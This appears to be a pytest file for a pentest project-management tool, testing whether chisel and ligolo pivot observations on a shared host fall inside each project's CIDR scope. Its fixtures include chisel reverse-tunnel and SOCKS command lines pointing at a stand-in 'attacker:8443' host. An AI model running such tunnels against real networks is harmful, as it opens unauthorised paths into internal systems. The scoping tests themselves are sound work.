"""
Tests for project-scope-based pivot observation filtering.

Scenario:
  - One shared chisel/ligolo host is used by multiple projects.
  - Each project has its own CIDR scopes.
  - /collect for project A must keep only observations whose routing
    info falls inside project A's scopes; project B's routes seen on
    the same shared box must NOT be written into project A.
"""
import ipaddress

import pytest

from app.routers.pivots import (
    _extract_params_from_notes,
    _observation_scope_decision,
    _parse_tool_observations,
)


def _net(cidr: str):
    return ipaddress.ip_network(cidr, strict=False)


# ── route_cidr matching ───────────────────────────────────────────

def test_in_scope_when_route_cidr_subnet_of_scope():
    item = {"route_cidr": "10.0.0.0/24", "notes": ""}
    decision = _observation_scope_decision(item, [_net("10.0.0.0/16")])
    assert decision == "in_scope"


def test_in_scope_when_route_cidr_overlaps_scope():
    item = {"route_cidr": "10.0.0.0/16", "notes": ""}
    decision = _observation_scope_decision(item, [_net("10.0.0.0/24")])
    assert decision == "in_scope"


def test_out_of_scope_when_route_cidr_disjoint():
    item = {"route_cidr": "192.168.1.0/24", "notes": ""}
    decision = _observation_scope_decision(item, [_net("10.0.0.0/8")])
    assert decision == "out_of_scope"


# ── chisel forward target IP matching ─────────────────────────────

def test_chisel_forward_target_ip_in_scope():
    # parser-style notes: full ps line + params trailer
    notes = (
        "./chisel client https://attacker:8443 R:8080:10.0.0.5:80\n"
        "#params: {\"mode\":\"client\",\"direction\":\"reverse\","
        "\"proxy_type\":\"tcp\","
        "\"forwards\":[{\"direction\":\"reverse\",\"proxy_type\":\"tcp\","
        "\"target_host\":\"10.0.0.5\",\"target_port\":80,\"raw\":\"R:8080:10.0.0.5:80\"}]}"
    )
    item = {"route_cidr": "", "notes": notes}
    decision = _observation_scope_decision(item, [_net("10.0.0.0/24")])
    assert decision == "in_scope"


def test_chisel_forward_target_ip_disjoint_is_out_of_scope():
    notes = (
        "./chisel client https://attacker:8443 R:8080:192.168.1.5:80\n"
        "#params: {\"forwards\":[{\"target_host\":\"192.168.1.5\",\"target_port\":80}]}"
    )
    item = {"route_cidr": "", "notes": notes}
    decision = _observation_scope_decision(item, [_net("10.0.0.0/24")])
    assert decision == "out_of_scope"


def test_chisel_socks_only_with_no_routes_is_ambiguous():
    """A SOCKS proxy with no route_cidr and no IP target — we can't tell
    which project it serves. Should be flagged ambiguous, not dropped
    by default."""
    notes = (
        "./chisel client https://attacker:8443 R:socks\n"
        "#params: {\"forwards\":[{\"target_host\":null,\"raw\":\"R:socks\",\"proxy_type\":\"socks\"}]}"
    )
    item = {"route_cidr": "", "notes": notes}
    decision = _observation_scope_decision(item, [_net("10.0.0.0/24")])
    assert decision == "ambiguous"


def test_chisel_hostname_target_is_ambiguous():
    """If the forward target is a hostname (not an IP), we can't resolve
    it server-side without DNS lookups — treat as ambiguous."""
    notes = (
        "./chisel client https://attacker:8443 L:8080:internal.lan:80\n"
        "#params: {\"forwards\":[{\"target_host\":\"internal.lan\",\"target_port\":80}]}"
    )
    item = {"route_cidr": "", "notes": notes}
    decision = _observation_scope_decision(item, [_net("10.0.0.0/24")])
    assert decision == "ambiguous"


# ── empty scope list disables the filter ──────────────────────────

def test_no_project_scopes_means_no_filter():
    """If the project has no CIDR scopes defined, every observation is
    considered in_scope — we have nothing to filter against."""
    item = {"route_cidr": "10.0.0.0/24", "notes": ""}
    assert _observation_scope_decision(item, []) == "in_scope"


# ── params extractor round-trip ───────────────────────────────────

def test_extract_params_from_notes_round_trip():
    notes = 'raw ps line here\n#params: {"mode":"client","direction":"reverse"}'
    params = _extract_params_from_notes(notes)
    assert params["mode"] == "client"
    assert params["direction"] == "reverse"


def test_extract_params_missing_trailer():
    assert _extract_params_from_notes("just a raw line, no trailer") == {}


def test_extract_params_malformed_json_returns_empty():
    notes = 'raw line\n#params: {not valid json'
    assert _extract_params_from_notes(notes) == {}


# ── end-to-end shape ─────────────────────────────────────────────

def test_e2e_two_projects_share_one_chisel_host():
    """Two projects share one chisel host. Each project's collect should
    only see its own forwards."""
    ps_lines = [
        # Project A: forward to 10.0.0.5
        "./chisel client https://attacker:8443 R:8080:10.0.0.5:80",
        # Project B: forward to 192.168.1.5
        "./chisel client https://attacker:8443 R:9090:192.168.1.5:443",
    ]
    obs = _parse_tool_observations(ps_lines, [], [])
    assert len(obs) == 2

    project_a_scope = [_net("10.0.0.0/24")]
    project_b_scope = [_net("192.168.1.0/24")]

    in_a = [o for o in obs if _observation_scope_decision(o, project_a_scope) == "in_scope"]
    in_b = [o for o in obs if _observation_scope_decision(o, project_b_scope) == "in_scope"]

    assert len(in_a) == 1
    assert len(in_b) == 1
    assert "10.0.0.5" in in_a[0]["notes"]
    assert "192.168.1.5" in in_b[0]["notes"]
